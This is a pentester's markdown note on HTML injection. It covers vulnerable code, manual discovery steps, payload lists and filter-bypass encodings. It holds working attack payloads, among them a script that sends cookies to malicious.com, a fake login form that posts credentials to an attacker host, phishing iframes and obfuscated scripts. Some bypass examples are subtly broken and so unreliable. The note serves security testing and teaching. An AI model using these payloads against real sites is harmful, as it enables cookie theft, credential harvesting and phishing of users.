# Index
- [[Front End Vulnerabilities]]
	- [[1. Sensitive Data Exposure]]
	- [[2. HTML Injection]]
	- [[3. Insecure Direct Object References (IDOR)]]
	- [[4. Cross-Site Scripting (XSS)]]
	- [[5. Cross-Site Request Forgery (CSRF)]]
	- [[6. Insufficient Transport Layer Protection]]
	- [[7. Insecure Handling of Cookies and Sessions]]
	- [[8. Security Misconfigurations|8. Security Misconfigurations]]

# HTML Injection 

HTML Injection is a vulnerability that allows an attacker to inject arbitrary HTML code into a web application. When the application renders this injected HTML without proper sanitization, it can result in altered content, phishing attacks, and even more serious vulnerabilities like Cross-Site Scripting (XSS). This vulnerability usually occurs when user input is embedded into HTML without proper escaping or sanitization.

# How HTML Injection Works

HTML Injection occurs when user-provided content is included in the web page's HTML without sanitization. The injected HTML alters the structure of the page, allowing the attacker to modify content, display malicious links, or create fake forms. In some cases, attackers can escalate HTML Injection to execute malicious JavaScript (turning it into an XSS vulnerability).

## Example of Vulnerable Code

```html
<!-- Example of a vulnerable page -->
<div>
    <p>Comment: <span id="user-comment">Welcome, <username>!</span></p>
</div>
```

In this example, the `<username>` placeholder is populated with user input. If the input is not sanitized, an attacker could inject arbitrary HTML like:

```html
<script>alert('HTML Injection!');</script>
```

The server might return the following:

```html
<div>
    <p>Comment: <span id="user-comment">Welcome, <script>alert('HTML Injection!');</script></span></p>
</div>
```

The injected script is executed by the browser, demonstrating the vulnerability.

# Types of HTML Injection

1. **Stored (Persistent) HTML Injection:** 
   - The malicious HTML is stored on the server (e.g., in a database) and is rendered whenever the affected page is accessed. It impacts multiple users and persists across sessions.

2. **Reflected (Non-persistent) HTML Injection:** 
   - The injected HTML is reflected immediately back to the user, often through query parameters or form input. The malicious input is not stored on the server but is executed when a user accesses a specially crafted URL or submits the form.

# Manual Discovery Techniques for HTML Injection

To manually discover HTML Injection vulnerabilities, testers can interact with web applications to identify locations where user input is reflected in HTML output without being properly sanitized. Below are step-by-step techniques to identify HTML Injection vulnerabilities.

## Identify Potential Injection Points

Potential locations for HTML Injection include:
- **Search fields:** Search terms may be reflected in the page content.
- **Comment sections:** User-provided comments may be displayed directly on the page.
- **Form fields:** Inputs such as "username," "bio," or "description" are commonly vulnerable.
- **URL query parameters:** Data passed in the URL (e.g., `?query=test`) might be reflected without sanitization.
- **Error messages:** User inputs reflected in error messages are often a potential source of HTML Injection.

By identifying these areas, you can focus your testing efforts on the most likely vulnerable points.

## Test with Basic HTML Payloads

Start with simple HTML tags to determine if the application properly sanitizes or escapes user inputs.

**Basic HTML Payloads:**

```html
<b>Bold Text</b>
<i>Italic Text</i>
<u>Underlined Text</u>
```

Here’s how to test:
- **Search fields:** Enter the payloads into the search field and submit. For example: `<b>Bold Text</b>`.
- **Comment sections:** Post a comment containing HTML tags like `<b>Bold Comment</b>` and check if it appears in bold.
- **Form fields:** Inject HTML into form fields (e.g., name, comment) and observe the result.
- **URL query parameters:** Modify URLs to inject HTML, such as `http://<target_domain>/search.php?query=<b>Bold Text</b>`.
- **Error messages:** Try injecting HTML into fields that trigger error messages, such as login forms.

If the injected HTML is rendered (e.g., text appears bold), the input is not properly sanitized, and the application may be vulnerable to HTML Injection.

## Modify Query Parameters

URL query parameters can also be vulnerable to HTML Injection. Modify these parameters with HTML payloads to see if the injected code is reflected in the response.

Original URL:
```
http://<target_domain>/search.php?query=test
```

Inject an HTML payload:
```
http://<target_domain>/search.php?query=<b>Bold Text</b>
```

If the text appears bold on the page, it indicates that the application is vulnerable to HTML Injection.

## Inject HTML into Form Fields

Forms are another common source of HTML Injection vulnerabilities. Inject HTML code into fields such as "Username," "Comment," or "Bio," and observe the response.

Example form field payloads:

```html
<b>Injected Bold Text</b>
<a href="http://malicious.com">Click Here</a>
<img src="x" onerror="alert('HTML Injection!')">
```

Submit the form and check the resulting page for HTML rendering. If the payload is reflected without sanitization, HTML Injection is possible.

## Test Error Messages

HTML Injection can occur in error messages that reflect user input. For example, in a login form where an error message like "User `<username>` not found" is displayed, inject HTML payloads into the username field and observe how they are handled.

Example:
```
Username: <b>Injected Bold Username</b>
Password: <any_password>
```

If the error message includes the bold text, this suggests that the application is vulnerable to HTML Injection.

## Use Interception Tools

Tools like **Burp Suite** or **OWASP ZAP** allow you to inspect requests and responses between the browser and server. You can inject HTML payloads into input fields or query parameters and observe whether the input is reflected unsanitized in the server’s response.

For example, if you inject `<b>Injected Bold Text</b>` into a form field, inspect the HTTP response to see if it is reflected in the HTML structure:

```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
    <body>
        <p>Comment: <b>Injected Bold Text</b></p>
    </body>
</html>
```

If the HTML is rendered without escaping, the input is not sanitized.

## Inspect HTML Source with Developer Tools

After injecting HTML payloads into a page, use browser developer tools to inspect the source code of the rendered page. Right-click on the page and select **"View Source"** or **"Inspect Element"** to see how your input is rendered in the DOM.

For example, if you inject `<b>Bold Text</b>`, check whether the page displays:
```html
<p>Comment: <b>Bold Text</b></p>
```

This indicates that the input is being reflected directly into the HTML without sanitization, making the application vulnerable.

# HTML Injection Payloads

## Crafting HTML Injection Payloads
When crafting HTML Injection payloads, attackers consider several factors:

1. **Context:** The context in which the input is used (HTML, attributes, etc.) affects the payload design.
2. **Encoding:** Different encoding methods (URL encoding, HTML encoding) can be used to bypass filters.
3. **Filter Evasion:** Techniques like obfuscation and encoding are used to evade security filters.

#### Example of Context-Specific Payloads

1. **HTML Context**

```
<p>Welcome, <b><?php echo $_GET['name']; ?></b></p>
```

Payload:

```
<h1>Injected HTML</h1>
```

2. **Attribute Context**

```
<img src="<?php echo $_GET['image']; ?>">
```

Payload:

```
x" onerror="alert('Injected HTML');
```

## Basic HTML Injection Payloads

Here are some simple payloads you can use to manually test for HTML Injection vulnerabilities:

```html
<b>Bold Text</b>              <!-- Makes text bold -->
<i>Italic Text</i>            <!-- Makes text italic -->
<u>Underlined Text</u>        <!-- Underlines text -->
<a href="http://malicious.com">Click Me</a>  <!-- Creates a clickable link -->
<img src="invalid-url" onerror="alert('HTML Injection!')">  <!-- Triggers an alert if the image fails to load -->
```

- **Injected Heading:** This payload injects an HTML heading element into the page.

```
<div>Click <a href="http://malicious-site.com">here</a> to win a prize!</div>
```

- **Image Tag:** This payload uses an image tag to test if HTML injection is possible and if the application correctly handles HTML attributes.

```
<img src="http://malicious-site.com/image.jpg">
```

- **Image Error:** This payload uses an image tag with an invalid source. When the image fails to load, the `onerror` event handler triggers an alert.

```
<img src="x" onerror="alert('Injected HTML');">
```

- **Style Injection:** This payload injects a style attribute to change the appearance of the page.

```
<div style="color:red">Injected HTML</div>
```

These basic payloads are useful for determining whether the web application is escaping or sanitizing user input before rendering it.

## Advanced HTML Injection Payloads

If you suspect a more sophisticated vulnerability or if basic payloads do not reveal a vulnerability, you can escalate your testing with more advanced payloads. These payloads may be used to inject JavaScript or other potentially dangerous code.

- **JavaScript Alert Payloads (XSS Escalation):** If this payload executes, you have not only discovered HTML Injection but also Cross-Site Scripting (XSS).

```html
<script>alert('Injected!');</script>       <!-- Executes a JavaScript alert -->
<img src="x" onerror="alert('Injected!')"> <!-- Triggers a JavaScript alert via onerror -->
```

- **Iframe Injection Payload (Phishing):** This payload injects an iframe into the page, which can be used for phishing by embedding malicious content from another site.

```html
<iframe src="http://malicious.com" width="400" height="400"></iframe>
```

- **Content Spoofing (Phishing):** This payload changes the content of the page to display a phishing message or other misleading information.

```
<div>
  <p>Your session has expired. Please <a href="http://attacker.com/login">login again</a>.</p>
</div>
```

- **Fake Form Injection Payload (Credential Harvesting):** This payload injects a fake login form that submits data to an attacker-controlled server. It can be used for credential harvesting in phishing attacks.

```html
<form action="http://malicious.com/login" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

- **Obfuscated Script Injection (Bypassing Filters):** This payload uses `String.fromCharCode()` to obfuscate the JavaScript alert, making it more difficult for filters to detect.

```html
<script>String.fromCharCode(97,108,101,114,116)(document.cookie);</script>
```

- **HTML Comment Injection (UI Alteration):** Injecting comments or CSS can be used to manipulate the UI by hiding elements or changing the appearance of the page.

```html
<!-- <style>body {display: none}</style> -->
```

- **Embedded Script (XSS):** This payload injects a script tag to perform an XSS attack.

```
<div><script>alert('HTML Injection');</script></div>
```

- **Cookie Stealing Payload (XSS Escalation):** This payload sends the user’s cookies to an attacker-controlled server. If executed, it indicates the application is vulnerable to XSS, which is more severe than basic HTML Injection.

```html
<script>document.location="http://malicious.com/steal?cookie="+document.cookie;</script>
```

- **Event Handler Injection (Bypassing Restrictions):** This payload uses an event handler (`onclick`) to execute JavaScript when the user interacts with an element on the page. It bypasses some filters that may block `<script>` tags but allow event handlers.

```html
<div onclick="alert('Injected!')">Click me</div>
```

# Bypassing Defenses
Bypassing defenses against HTML Injection involves understanding and evading common security measures implemented in web applications. Attackers use various techniques to evade filters and security mechanisms.

## Encoding and Obfuscation

1. **HTML Entity Encoding:** Encode special characters using HTML entities to bypass filters that block certain HTML tags.

```
& lt;div & gt; Click & lt;a href=& quot;http://malicious-site.com & quot;& gt; here & lt;/a& gt; to win a prize!& lt;/div & gt;
```

2. **Hex/Unicode Encoding:** Use hexadecimal or Unicode encoding to represent characters.

```
%3Cdiv%3EClick%20%3Ca%20href%3D%22http%3A%2F%2Fmalicious-site.com%22%3Ehere%3C%2Fa%3E%20to%20win%20a%20prize!%3C%2Fdiv%3E
```

## Filter Bypass Techniques

1. **Comment Obfuscation:** Use HTML comments to break up payloads and bypass filters.

```
<di<!-- -->v>Click <a href="http://malicious-site.com">here</a> to win a prize!</di<!-- -->v>
```

2. **Attribute Manipulation:** Manipulate HTML attributes to inject payloads.

```
<svg onload="alert('HTML Injection')">
```

## Browser Inconsistencies

1. **Exploiting Browser Quirks:** Use inconsistencies in how different browsers parse HTML to bypass filters.

```
<scr\00ipt>alert('HTML Injection');</scr\00ipt>
```

2. **Mixed Contexts:** Combine different contexts, such as CSS and HTML, to evade filters.

```
<style>@import'javascript:alert(1)';</style>
```

# Resources

|**Website**|**URL**|
|-|-|
| OWASP - HTML Injection                        | https://owasp.org/www-community/attacks/HTML_Injection                                                                                                     |
| Veracode - HTML Injection                     | https://www.veracode.com/security/html-injection                                                                                                           |
| Github - PayloadBox - HTML Injection Payloads | [https://github.com/payloadbox/html-injection-payload-list](https://github.com/payloadbox/html-injection-payload-list)                                     |
| GitHub - PayloadAllTheThings - HTML Injection | [https://github.com/0x065C/PayloadsAllTheThings/tree/master/HTML%20Injection](https://github.com/0x065C/PayloadsAllTheThings/tree/master/HTML%20Injection) |
